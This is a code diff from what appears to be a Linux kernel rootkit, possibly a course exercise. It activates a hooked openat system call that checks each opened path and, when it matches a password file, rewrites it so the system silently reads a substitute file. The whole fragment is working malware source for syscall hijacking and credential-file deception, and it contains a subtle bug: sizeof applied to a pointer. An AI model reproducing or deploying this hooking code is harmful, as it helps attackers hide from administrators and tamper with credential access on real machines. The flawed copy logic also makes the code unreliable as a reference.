@@ -44,13 +44,13 @@ int disable_page_rw(void *ptr){
 asmlinkage int (*original_openat)(struct pt_regs *);
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
-  // const char *pathname = regs->si;
-  // const char kpathname[PATH_MAX] = {0};
-  // const char *temppathname = TEMPPASSWORDFILE;
-  // strncpy_from_user(kpathname, pathname, PATH_MAX);
-  // if(strcmp(kpathname, PASSWORDFILE) == 0) {
-  //   copy_to_user(pathname, temppathname, sizeof(temppathname));
-  // }
+  char *pathname = (char *)regs->si;
+  char kpathname[100] = {0};
+  char *temppathname = TEMPPASSWORDFILE;
+  strncpy_from_user(kpathname, pathname, 100);
+  if(strcmp(kpathname, PASSWORDFILE) == 0) {
+    copy_to_user(pathname, temppathname, sizeof(temppathname));
+  }
   return (*original_openat)(regs);
 }
 
